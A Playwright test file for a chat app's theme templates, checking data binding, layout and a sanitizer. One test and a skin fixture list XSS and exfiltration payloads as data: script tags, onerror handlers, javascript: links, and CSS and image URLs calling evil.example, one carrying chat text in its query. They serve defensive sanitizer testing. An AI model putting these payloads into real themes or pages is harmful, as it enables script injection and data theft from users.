// A theme's own layout: HTML templates that rearrange the chat and show its
// data (chrome/template.js, renderer/theme_layout.js). A theme is a shared
// file, so what matters as much as the layout is what a template cannot do:
// run code, take a tap anywhere it likes, or send what it shows anywhere.
import { test, expect } from '@playwright/test';

const PAGE = '/assets/chat_webview/index.html';

async function boot(page) {
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.addInitScript(() => {
    window.__calls = [];
    window.flutter_inappwebview = {
      callHandler: (...args) => { window.__calls.push(args); return Promise.resolve(null); },
    };
  });
  await page.goto(PAGE);
  await page.waitForFunction(() => !!window.bridge);
  await page.evaluate(() => {
    window.__M = (id, role, text, extra = {}) => ({
      id, role, text,
      timestamp: 1767225600000,
      displayName: role === 'user' ? 'You' : 'Alice',
      isError: false, isHidden: false, isGenerating: false,
      ...extra,
    });
    window.__set = (list) => window.bridge.setMessages(JSON.stringify(list));
  });
  return errors;
}

/** Runs template.js in the page: compile [src] and mount it with [data]. */
async function mountTemplate(page, src, data) {
  return page.evaluate(async ({ src, data }) => {
    const T = await import('/assets/chat_webview/chrome/template.js');
    const box = document.createElement('div');
    box.id = 'tpl-box';
    document.body.appendChild(box);
    const tpl = T.compile(src);
    const view = T.mount(tpl, data, box, null, {});
    window.__view = view;
    return { errors: tpl.errors, html: box.innerHTML };
  }, { src, data });
}

test('bindings, conditions and lists render and follow the data', async ({ page }) => {
  await boot(page);
  const first = await mountTemplate(page, `
    <div class="who {{role}}">{{ name }}<b g-if="count > 1">{{count}} items</b><i g-else>one</i></div>
    <ul><li g-each="items" g-as="it">{{index}}:{{label}}{{ it.extra ? '!' : '' }}</li></ul>`,
  { role: 'char', name: 'Alice', count: 2, items: [{ label: 'a' }, { label: 'b', extra: true }] });
  expect(first.errors).toEqual([]);
  expect(first.html.replace(/\s+/g, ' ')).toContain('<div class="who char">Alice<b>2 items</b></div>');
  expect(first.html).toContain('<li>0:a</li>');
  expect(first.html).toContain('<li>1:b!</li>');
  const next = await page.evaluate(() => {
    window.__view.update({ role: 'user', name: 'Bob', count: 1, items: [{ label: 'z' }] });
    return document.getElementById('tpl-box').innerHTML;
  });
  expect(next).toContain('<div class="who user">Bob<i>one</i></div>');
  expect(next).toContain('<li>0:z</li>');
  expect(next).not.toContain('1:b');
});

test('a template cannot run code, link out or load anything', async ({ page }) => {
  await boot(page);
  const out = await mountTemplate(page, `
    <script>window.__ran = 1</script>
    <img src="x" onerror="window.__ran = 2">
    <img src="https://evil.example/p.png">
    <img src="https://evil.example/?q={{text}}">
    <img src="{{ ok ? 'https://evil.example/1' : '' }}">
    <img src="data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%3E">
    <img src="{{avatarUrl}}">
    <a href="javascript:window.__ran=3">x</a>
    <iframe srcdoc="<script>parent.__ran=4</script>"></iframe>
    <svg><use href="https://evil.example/s.svg#a"></use><image href="https://evil.example/i.png"></image></svg>
    <div style="background:url(https://evil.example/b.png)">s1</div>
    <div style="background:u\\72l(https://evil.example/b.png)">s2</div>
    <div style="background-image:image-set('https://evil.example/c.png' 1x)">s3</div>
    <div style="color: {{ color }}">s4</div>
    <div style="background:url('data:image/png;base64,AAAA')">s5</div>
    <div style="background:url(data:image/png;base64,AAAA)">s5b</div>
    <div id="chat-container" class="ok" onclick="window.__ran=5">s6</div>
    <style>body{display:none}</style>
    <textarea>{{text}}</textarea>`,
  { text: 'secret', ok: true, avatarUrl: 'file:///avatars/a.png', color: 'red; background: url(https://evil.example/d.png)' });
  await page.waitForTimeout(100);
  expect(await page.evaluate(() => window.__ran)).toBeUndefined();
  const html = out.html;
  expect(html).not.toContain('evil.example');
  expect(html).not.toContain('onerror');
  expect(html).not.toContain('onclick');
  expect(html).not.toContain('<script');
  expect(html).not.toContain('<iframe');
  expect(html).not.toContain('<a');
  expect(html).not.toContain('<style');
  expect(html).not.toContain('<textarea');
  expect(html).not.toContain('id="chat-container"');
  expect(html).toContain('<img src="file:///avatars/a.png">');
  expect(html).toContain('data:image/png;base64,AAAA');
  // An unquoted data: URL keeps its `;`, and the rule is not cut in half.
  expect(html).toContain('url(data:image/png;base64,AAAA)');
  expect(html).toContain('data:image/svg+xml,%3Csvg');
  expect(html).toContain('<div>s4</div>');
  expect(out.errors.length).toBeGreaterThan(5);
  // Nothing went out.
  const requests = [];
  page.on('request', (r) => { if (r.url().includes('evil.example')) requests.push(r.url()); });
  await page.waitForTimeout(100);
  expect(requests).toEqual([]);
});

const MESSAGE = `
  <div class="card {{role}}">
    <div class="top"><g-part name="avatar"></g-part><span class="nm">{{name}}</span>
      <span class="idx" g-if="index">#{{index}}</span>
      <span class="sw" g-if="swipe.total > 1">{{swipe.index}}/{{swipe.total}}</span>
      <span class="last" g-if="isLast">last</span>
    </div>
    <g-part name="content"></g-part>
    <button class="menu" g-action="open-actions"><g-icon name="close" size="16"></g-icon></button>
  </div>`;

test('a message template places the pieces and keeps them live', async ({ page }) => {
  const errors = await boot(page);
  await page.evaluate((tpl) => {
    window.bridge.setThemeLayout(JSON.stringify({ message: tpl, css: '.card{border:1px solid red}' }));
    window.__set([
      window.__M('u1', 'user', 'hello', { messageIndex: 0 }),
      window.__M('c1', 'assistant', 'hi **there**', { messageIndex: 1, swipeTotal: 3, swipeIndex: 0, isLast: true }),
    ]);
  }, MESSAGE);
  const c1 = page.locator('[data-message-id="c1"]');
  await expect(c1.locator('.card.char .top .msg-avatar')).toHaveCount(1);
  await expect(c1.locator('.card .nm')).toHaveText('Alice');
  await expect(c1.locator('.card .idx')).toHaveText('#2');
  await expect(c1.locator('.card .sw')).toHaveText('1/3');
  await expect(c1.locator('.card .last')).toHaveCount(1);
  // The body is still the renderer's own, inside the template.
  await expect(c1.locator('.card > g-part > .msg-content-stack .msg-body .message-content')).toHaveCount(1);
  // The pieces the template left out are kept, out of sight.
  await expect(c1.locator('.g-unplaced .msg-header')).toHaveCount(1);
  expect(await c1.locator('.g-unplaced').evaluate((el) => getComputedStyle(el).display)).toBe('none');
  // The theme's stylesheet is in the page.
  expect(await c1.locator('.card').evaluate((el) => getComputedStyle(el).borderTopColor)).toBe('rgb(255, 0, 0)');

  // Live updates reach the template's data.
  await page.evaluate(() => {
    window.bridge.updateMessageMeta(JSON.stringify({ id: 'c1', swipeIndex: 1, swipeTotal: 3, messageIndex: 4 }));
    window.bridge.setIdentity({ charName: 'Seraphina' });
    window.bridge.setLastMessage('u1');
  });
  await expect(c1.locator('.card .sw')).toHaveText('2/3');
  await expect(c1.locator('.card .idx')).toHaveText('#5');
  await expect(c1.locator('.card .nm')).toHaveText('Seraphina');
  await expect(c1.locator('.card .last')).toHaveCount(0);
  await expect(page.locator('[data-message-id="u1"] .card .last')).toHaveCount(1);

  // A g-action is the page's own message action, on this message.
  await c1.locator('.card .menu').click();
  await expect.poll(() => page.evaluate(() => window.__calls
    .filter((c) => c[0] === 'onMessageContext')
    .map((c) => JSON.parse(c[1]).id))).toEqual(['c1']);

  // Dropping the layout puts every piece back.
  await page.evaluate(() => window.bridge.setThemeLayout(''));
  await expect(c1.locator('.card')).toHaveCount(0);
  await expect(c1.locator('.g-unplaced')).toHaveCount(0);
  await expect(c1.locator(':scope > .msg-header > .msg-avatar')).toHaveCount(1);
  await expect(c1.locator(':scope > .msg-content-stack > .msg-footer')).toHaveCount(1);
  expect(await page.locator('#glaze-theme-layout').count()).toBe(0);
  expect(errors).toEqual([]);
});

test('streamed text reaches the template without rebuilding the body', async ({ page }) => {
  await boot(page);
  await page.evaluate(() => {
    window.bridge.setThemeLayout(JSON.stringify({
      message: '<div class="t">{{text}}</div><g-part name="content"></g-part>',
    }));
    window.__set([window.__M('c1', 'assistant', 'one', { messageIndex: 0 })]);
  });
  const c1 = page.locator('[data-message-id="c1"]');
  await expect(c1.locator('.t')).toHaveText('one');
  const host = await c1.locator('.message-content').elementHandle();
  await page.evaluate(() => window.bridge.updateMessage(JSON.stringify(window.__M('c1', 'assistant', 'one two', { messageIndex: 0 }))));
  await expect(c1.locator('.t')).toHaveText('one two');
  expect(await host.evaluate((el) => el.isConnected)).toBe(true);
});

/* ---------- The chrome ---------- */

const CHROME = {
  theme: { accent: [196, 42, 74, 1], fillHeader: [30, 30, 30, 0.8], fillSurface: [25, 25, 26, 0.8], blurSigma: 12 },
  layout: { safeTop: 24, safeBottom: 16, inset: 16, viewportH: 720, gutter: 0, fades: false,
    drawer: { show: false, height: 300, progress: 0 } },
  header: { show: true, title: 'Seraphina', session: 'Session #3', avatar: { initial: 'S' },
    search: { kind: 'mobile', open: false, hint: 'Search' } },
  composer: { show: true, mode: 'compose', placeholder: 'Message...',
    pins: [{ key: 'action:attach', icon: { cp: 57521 }, tap: true }],
    send: { icon: { cp: 62754 }, tap: true, slot: false } },
};

const SKIN = {
  css: `@import url("https://evil.example/x.css"); @font-face{font-family:x;src:url(https://evil.example/f.woff)}
    .hdr2{display:flex;align-items:center;gap:8px;height:56px;padding:0 12px} .c2{display:flex;gap:6px}
    .bad{background:url(https://evil.example/b.png)} .bad2{background:u\\72l(https://evil.example/b.png)}
    .good{background:url("data:image/png;base64,AAAA")} @media (min-width:1px){.mq{color:red}}`,
  header: `<div class="hdr2"><g-part name="avatar"></g-part><div class="ttl">{{title}}</div>
    <button class="x" g-action="back"><g-icon name="close"></g-icon></button></div>`,
  composer: `<div class="c2"><g-part name="send"></g-part><g-part name="pill"></g-part>
    <span class="ht" g-if="hasText">typing</span></div>`,
  drawerCard: '<div class="my-card"><g-icon value="{{icon}}" size="24"></g-icon><b>{{label}}</b><i g-if="status">{{status}}</i></div>',
  drawerTab: '<span class="my-tab {{active ? \'on\' : \'\'}}">{{label}}</span>',
};

async function openChrome(page, { patch } = {}) {
  await page.addInitScript(() => {
    window.__calls = [];
    window.flutter_inappwebview = {
      callHandler: (...args) => { window.__calls.push(args); return Promise.resolve(null); },
    };
    // Tests only: open the chrome's shadow root to read what it drew.
    const attach = Element.prototype.attachShadow;
    Element.prototype.attachShadow = function (opts) {
      const root = attach.call(this, { ...opts, mode: 'open' });
      if (this.tagName.startsWith('GLAZE-')) window.__chromeRoot = root;
      return root;
    };
  });
  await page.goto(PAGE);
  await page.waitForFunction(() => !!window.__glazeChrome);
  if (patch) await page.evaluate(patch);
  const keys = await page.evaluate((state) => {
    const keys = window.__glazeChrome.handshake();
    window.__glazeChrome.apply(keys.split(':')[0], JSON.stringify(state));
    return keys;
  }, CHROME);
  const [keyIn, keyOut] = keys.split(':');
  const apply = (msg) => page.evaluate(([k, m]) => window.__glazeChrome.apply(k, JSON.stringify(m)), [keyIn, msg]);
  const q = (sel) => page.evaluate((s) => {
    const el = window.__chromeRoot.querySelector(s);
    return el ? { text: el.textContent.trim(), cls: el.className && String(el.className.baseVal ?? el.className) } : null;
  }, sel);
  const intents = () => page.evaluate((k) => window.__calls
    .filter((c) => c[0] === 'onChromeIntent' && c[1] === k).map((c) => JSON.parse(c[2])), keyOut);
  const center = (sel) => page.evaluate((s) => {
    const r = window.__chromeRoot.querySelector(s).getBoundingClientRect();
    return [r.left + r.width / 2, r.top + r.height / 2];
  }, sel);
  return { apply, q, intents, center };
}

test('the header and the compose area follow a theme layout', async ({ page }) => {
  await page.setViewportSize({ width: 400, height: 720 });
  const c = await openChrome(page);
  await c.apply({ skin: SKIN });
  expect(await c.q('.gc-hdr .hdr2 .gc-avatar')).not.toBeNull();
  expect((await c.q('.hdr2 .ttl')).text).toBe('Seraphina');
  expect(await c.q('.hdr2 .x .gc-icon svg')).not.toBeNull();
  // What it left out is still there, out of sight.
  expect(await c.q('.gc-hdr .g-unplaced .gc-hdr-lead')).not.toBeNull();
  // Its stylesheet is the chrome's, minus what would reach the network.
  expect(await page.evaluate(() => getComputedStyle(window.__chromeRoot.querySelector('.hdr2')).display)).toBe('flex');
  const sheet = await page.evaluate(() => [...window.__chromeRoot.querySelectorAll('style')].map((s) => s.textContent).join('\n'));
  expect(sheet).not.toContain('evil.example');
  expect(sheet).not.toContain('@import');
  expect(sheet).not.toContain('@font-face');
  expect(sheet).toContain('data:image/png;base64,AAAA');
  expect(sheet).toContain('@media (min-width:1px){.mq{color:red}}');

  await c.apply({ header: { title: 'Lilith' } });
  expect((await c.q('.hdr2 .ttl')).text).toBe('Lilith');
  const [bx, by] = await c.center('.hdr2 .x');
  await page.mouse.click(bx, by);
  expect((await c.intents()).filter((i) => i.t === 'back')).toHaveLength(1);

  // Compose: the send button went in front of the pill; the field still types.
  expect(await c.q('.c2 > g-part > .gc-send-wrap')).not.toBeNull();
  expect(await c.q('.c2 > g-part > .gc-pill .gc-input')).not.toBeNull();
  expect(await c.q('.c2 .ht')).toBeNull();
  const [ix, iy] = await c.center('.gc-input');
  await page.mouse.click(ix, iy);
  await page.keyboard.type('hey');
  expect(await c.q('.c2 .ht')).not.toBeNull();
  expect((await c.intents()).filter((i) => i.t === 'text').at(-1).d.v).toBe('hey');
  const [sx, sy] = await c.center('.gc-send');
  await page.mouse.click(sx, sy);
  expect((await c.intents()).filter((i) => i.t === 'sendTap').at(-1).d.v).toBe('hey');

  // Taking the layout away puts everything back.
  await c.apply({ skin: null });
  expect(await c.q('.hdr2')).toBeNull();
  expect(await c.q('.g-unplaced')).toBeNull();
  expect(await c.q('.gc-hdr-content > .gc-hdr-lead, .gc-hdr > * > .gc-hdr-lead')).not.toBeNull();
  expect(await c.q('.gc-row > .gc-send-wrap')).not.toBeNull();
});

test('drawer cards and tabs follow a theme layout and keep their taps', async ({ page }) => {
  await page.setViewportSize({ width: 400, height: 720 });
  const c = await openChrome(page);
  await c.apply({
    skin: SKIN,
    layout: { ...CHROME.layout, drawer: { show: true, height: 300, progress: 1 } },
    drawer: {
      show: true, tab: 0, editing: false,
      tabs: [{ label: 'Tools', icon: { cp: 59576 } }, { label: 'Actions', icon: { cp: 57521 } }],
      tools: { loading: false, cards: [{ kind: 'tool', key: 'tool:a', id: 'a', label: 'Alpha', status: 'on', icon: { cp: 57521 } }], add: null },
      actions: { loading: false, cards: [], add: null },
    },
  });
  await page.waitForTimeout(50);
  expect((await c.q('.gc-card .my-card b')).text).toBe('Alpha');
  expect((await c.q('.gc-card .my-card i')).text).toBe('on');
  expect(await c.q('.gc-card .my-card .gc-icon svg')).not.toBeNull();
  expect((await c.q('.gc-tab .my-tab.on')).text).toBe('Tools');
  const [x, y] = await c.center('.gc-card');
  await page.mouse.click(x, y);
  expect((await c.intents()).filter((i) => i.t === 'toolTap').map((i) => i.d.id)).toEqual(['a']);
});

test('a drawer taller than the viewport stays below the status bar', async ({ page }) => {
  await page.setViewportSize({ width: 400, height: 600 });
  const c = await openChrome(page);
  await c.apply({
    layout: { ...CHROME.layout, safeTop: 24, viewportH: 600, drawer: { show: true, height: 1200, progress: 1 } },
    drawer: {
      show: true, tab: 0, editing: false,
      tabs: [{ label: 'Tools', icon: { cp: 59576 } }, { label: 'Actions', icon: { cp: 57521 } }],
      tools: { loading: false, cards: [{ kind: 'tool', key: 'tool:a', id: 'a', label: 'Alpha', icon: { cp: 57521 } }], add: null },
      actions: { loading: false, cards: [], add: null },
    },
  });
  await page.waitForTimeout(50);
  const box = await page.evaluate(() => {
    const el = window.__chromeRoot.querySelector('.gc-drw');
    const tab = window.__chromeRoot.querySelector('.gc-tab');
    return { drawer: el.getBoundingClientRect().toJSON(), tab: tab.getBoundingClientRect().toJSON() };
  });
  expect(box.drawer.height).toBeLessThanOrEqual(600 - 24);
  expect(box.drawer.top).toBeGreaterThanOrEqual(24);
  expect(box.tab.height).toBeGreaterThan(0);
  expect(box.tab.top).toBeGreaterThanOrEqual(24);
});

test('drawer cards are built before the drawer opens', async ({ page }) => {
  const c = await openChrome(page);
  await c.apply({
    drawer: {
      show: false, tab: 0, editing: false,
      tabs: [{ label: 'Tools', icon: { cp: 59576 } }],
      tools: { loading: false, cards: [{ kind: 'tool', key: 'tool:a', id: 'a', label: 'Alpha', icon: { cp: 57521 } }], add: null },
      actions: { loading: false, cards: [], add: null },
    },
  });
  await page.waitForTimeout(50);
  const closed = await page.evaluate(() => {
    const root = window.__chromeRoot.querySelector('.gc-drw');
    return {
      hidden: root.classList.contains('gc-hidden'),
      cards: window.__chromeRoot.querySelectorAll('.gc-card').length,
    };
  });
  expect(closed).toEqual({ hidden: true, cards: 1 });
  // Opening only moves what is already there; no card build can stall the
  // first animation frame.
  await c.apply({ layout: { ...CHROME.layout, drawer: { show: true, height: 300, progress: 0.5 } } });
  expect(await page.evaluate(() => window.__chromeRoot.querySelectorAll('.gc-card').length)).toBe(1);
});

test('a theme layout hands a patched prototype no chrome node', async ({ page }) => {
  const c = await openChrome(page, {
    patch: () => {
      const leaked = [];
      const keep = Array.prototype.push;
      window.__leaked = leaked;
      let busy = false;
      const grab = (v) => {
        if (busy || !v || typeof v !== 'object') return;
        busy = true;
        try {
          // Playwright's own evaluation machinery runs in this page too.
          const stack = String(new Error().stack || '');
          if (stack.indexOf('/assets/chat_webview/chrome/') >= 0) keep.call(leaked, v);
        } finally { busy = false; }
      };
      // A setter on the prototype sees every value written to a key the
      // object does not have yet, then keeps it as the object's own.
      const trap = (proto, k) => Object.defineProperty(proto, k, {
        set(v) {
          grab(v);
          Object.defineProperty(this, k, { value: v, writable: true, enumerable: true, configurable: true });
        },
        configurable: true,
      });
      for (const k of ['0', '1', '2', '3']) trap(Array.prototype, k);
      for (const k of ['avatar', 'name', 'pill', 'send', 'content', 'back', 'icon', 'action', 'rescue',
        'update', 'scope', 'block', 'vars', 'action:attach']) trap(Object.prototype, k);
      const push = Array.prototype.push;
      Array.prototype.push = function (...a) { for (let i = 0; i < a.length; i++) grab(a[i]); return Reflect.apply(push, this, a); };
      const apply = Function.prototype.apply;
      const reflect = Reflect.apply;
      Function.prototype.call = function (self, ...a) { grab(self); for (let i = 0; i < a.length; i++) grab(a[i]); return reflect(this, self, a); };
      void apply;
    },
  });
  await c.apply({ skin: SKIN, header: { title: 'Again' } });
  await c.apply({
    skin: { ...SKIN, header: SKIN.header.replace('ttl', 'ttl2') },
    composer: { pins: [{ key: 'action:attach', icon: { cp: 57521 }, tap: true }, { key: 'action:x', icon: { cp: 57521 }, tap: true }] },
    layout: { ...CHROME.layout, drawer: { show: true, height: 300, progress: 1 } },
    drawer: {
      show: true, tab: 0, editing: false,
      tabs: [{ label: 'Tools', icon: { cp: 59576 } }, { label: 'Actions', icon: { cp: 57521 } }],
      tools: { loading: false, cards: [{ kind: 'tool', key: 'tool:a', id: 'a', label: 'Alpha', icon: { cp: 57521 } }], add: null },
      actions: { loading: false, cards: [], add: null },
    },
  });
  await page.waitForTimeout(50);
  // Only the chrome's own nodes count: the page's are the page's.
  const nodes = await page.evaluate(() => {
    let n = 0;
    for (let i = 0; i < window.__leaked.length; i++) {
      const v = window.__leaked[i];
      if (v instanceof Node && (v === window.__chromeRoot || v.getRootNode() === window.__chromeRoot)) n++;
      if (v && typeof v === 'object' && !(v instanceof Node)) {
        for (const k of Object.keys(v)) {
          const x = v[k];
          if (x instanceof Node && x.getRootNode() === window.__chromeRoot) n++;
        }
      }
    }
    return n;
  });
  expect(nodes).toBe(0);
});

test('a theme lays out the whole chat', async ({ page }) => {
  const theme = {
    message: '<div class="gl-card {{role}}"><div class="gl-nm">{{name}}</div>' +
      '<div class="gl-body"><g-part name="content"></g-part></div>' +
      '<div class="gl-foot"><g-part name="footer"></g-part></div></div>',
    css: '.gl-card { border-top: 1px solid rgb(18, 52, 86); }',
    header: '<div class="gl-bar"><g-part name="back"></g-part>' +
      '<g-part name="title"></g-part><g-part name="search"></g-part>' +
      '<button type="button" class="gl-btn" g-action="search">find</button></div>',
    composer: '<div class="gl-cmp"><g-part name="pill"></g-part>' +
      '<div class="gl-row"><g-part name="send"></g-part></div></div>',
    drawerCard: '<div class="gl-card">{{label}}</div>',
    drawerTab: '<span>{{label}}</span>',
    chromeCss: '.gl-bar{display:flex;align-items:center}.gl-cmp{display:flex}.gl-row{display:flex}',
  };
  await page.setViewportSize({ width: 400, height: 720 });
  const c = await openChrome(page);
  await c.apply({
    skin: {
      header: theme.header,
      composer: theme.composer,
      drawerCard: theme.drawerCard,
      drawerTab: theme.drawerTab,
      css: theme.chromeCss,
    },
  });
  await page.evaluate(({ message, css }) => {
    window.bridge.setThemeLayout(JSON.stringify({ message, css }));
    window.bridge.setMessages(JSON.stringify([
      {
        id: 'u1', role: 'user', text: 'hello there', timestamp: 1767225600000,
        displayName: 'You', isError: false, isHidden: false, isGenerating: false,
        messageIndex: 0,
      },
      {
        id: 'c1', role: 'assistant', text: 'hi **there**', timestamp: 1767225660000,
        displayName: 'Alice', isError: false, isHidden: false, isGenerating: false,
        messageIndex: 1, swipeTotal: 2, swipeIndex: 0, isLast: true, tokens: 42,
      },
    ]));
  }, { message: theme.message, css: theme.css });

  // The header the theme drew, with the app's own character block in it.
  const bar = page.evaluate(() => window.__chromeRoot.querySelector('.gl-bar'));
  expect(await bar).not.toBeNull();
  expect(await page.evaluate(() => !!window.__chromeRoot.querySelector('.gl-bar .gc-char'))).toBe(true);
  expect(await page.evaluate(() => window.__chromeRoot.querySelectorAll('.gl-bar .gc-icon').length)).toBeGreaterThanOrEqual(2);
  expect(await page.evaluate(() => !!window.__chromeRoot.querySelector('.gl-cmp .gc-pill'))).toBe(true);
  expect(await page.evaluate(() => !!window.__chromeRoot.querySelector('.gl-row .gc-send'))).toBe(true);

  // The messages the theme drew, with the app's body and footer in them.
  const c1 = page.locator('[data-message-id="c1"]');
  await expect(c1.locator('.gl-card.char')).toHaveCount(1);
  await expect(c1.locator('.gl-card .gl-nm')).toHaveText('Alice');
  await expect(c1.locator('.gl-card .gl-body .msg-content-stack .msg-body .message-content')).toHaveCount(1);
  await expect(c1.locator('.gl-card .gl-body .message-content')).toContainText('hi');
  await expect(c1.locator('.gl-card .gl-foot .msg-footer')).toHaveCount(1);
  await expect(page.locator('[data-message-id="u1"] .gl-card.user')).toHaveCount(1);
  // Search still works: its field is inside the title the theme placed.
  const [sx, sy] = await page.evaluate(() => {
    const r = window.__chromeRoot.querySelector('.gl-bar .gl-btn:last-child').getBoundingClientRect();
    return [r.left + r.width / 2, r.top + r.height / 2];
  });
  await page.mouse.click(sx, sy);
  await expect.poll(() => page.evaluate(() => {
    const f = window.__chromeRoot.querySelector('.gc-hdr-searchfield');
    return f ? getComputedStyle(f).display !== 'none' && f.getBoundingClientRect().width > 50 : false;
  })).toBe(true);

  // The theme's message stylesheet is in the page.
  expect(await c1.locator('.gl-card').evaluate((el) => getComputedStyle(el).borderTopWidth)).toBe('1px');
  expect(await page.evaluate(() => !!document.getElementById('glaze-theme-layout'))).toBe(true);
});

test('a theme can style what a message draws inside its shadow root', async ({ page }) => {
  await boot(page);
  await page.evaluate(() => {
    window.bridge.setThemeLayout(JSON.stringify({
      message: '<g-part name="content"></g-part>',
      contentCss: '.glaze-message pre { background: rgb(1, 2, 3); }',
    }));
    window.__set([window.__M('c1', 'assistant', '```\ncode\n```', { messageIndex: 0 })]);
  });
  const c1 = page.locator('[data-message-id="c1"]');
  await expect(c1.locator('.message-content')).toHaveCount(1);
  const color = () => c1.locator('.message-content').evaluate((host) => {
    const pre = host.shadowRoot.querySelector('pre');
    return pre ? getComputedStyle(pre).backgroundColor : null;
  });
  await expect.poll(color).toBe('rgb(1, 2, 3)');
  // A message rendered after the theme was set gets it too.
  await page.evaluate(() => window.bridge.appendMessage(JSON.stringify(
    window.__M('c2', 'assistant', '```\nmore\n```', { messageIndex: 1 }),
  )));
  const c2 = page.locator('[data-message-id="c2"]');
  await expect.poll(() => c2.locator('.message-content').evaluate((host) => {
    const pre = host.shadowRoot.querySelector('pre');
    return pre ? getComputedStyle(pre).backgroundColor : null;
  })).toBe('rgb(1, 2, 3)');
  // Changing it reaches the messages already drawn.
  await page.evaluate(() => window.bridge.setThemeLayout(JSON.stringify({
    message: '<g-part name="content"></g-part>',
    contentCss: '.glaze-message pre { background: rgb(4, 5, 6); }',
  })));
  await expect.poll(color).toBe('rgb(4, 5, 6)');
  // Dropping the layout takes it away.
  await page.evaluate(() => window.bridge.setThemeLayout(''));
  await expect.poll(() => c1.locator('.message-content').evaluate((host) => {
    const s = host.shadowRoot.getElementById('glaze-theme-content');
    return s ? 'present' : 'gone';
  })).toBe('gone');
});
